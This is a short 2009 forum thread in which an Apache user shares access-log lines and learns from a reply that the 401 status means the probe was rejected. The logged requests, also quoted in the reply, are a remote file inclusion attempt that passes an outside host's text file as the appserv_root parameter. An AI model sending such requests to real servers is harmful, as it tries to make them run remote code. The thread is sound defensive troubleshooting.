---
title: "Possible Intrusion?"
date: 2009-07-25
forum: Server Platforms
---

### Post by lmlypfan on 2009-07-25
For the first time I opened up my apache server to the web. I'm just sharing a few directories of music. It's password protected, and the directory permissions are 755. 

I checked my access log, and found a this snippet below. 
80.73.146.98 is from spain. I then went to 190.161.40.22/appserv/t.text

and found this:

<html>
<head>
<title>Vulner4bl3</title>
VulnerabLe

```
sudo cat /var/log/Apache2/access.log

80.73.146.98 - - [25/Jul/2009:13:03:18 -0400] "GET /appserv/main.php?appserv_root=http://190.161.40.22/appserv/t.txt? HTTP/1.1" 401 371 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
80.73.146.98 - - [25/Jul/2009:13:07:01 -0400] "GET /appserv/main.php?appserv_root=http://190.161.40.22/appserv/t.txt? HTTP/1.1" 401 371 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
```

Any insight would be greatly appreciated.

---

### Post by gombadi on 2009-07-25
> 
For the first time I opened up my apache server to the web. I'm just sharing a few directories of music. It's password protected, and the directory permissions are 755.


> 
80.73.146.98 - - [25/Jul/2009:13:03:18 -0400] "GET /appserv/main.php?appserv_root=http://190.161.40.22/appserv/t.txt? HTTP/1.1" 401 371 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"


Congratulations it works :-)

The 401 in the log file line is the return code that the web server sent to the remote end. A 401 means the request was rejected because the remote machine was not authorized to see the page.

See [http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html](http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html) for more details

---

### Post by lmlypfan on 2009-07-25
Thanks for the reply.
Makes perfect sense.

---

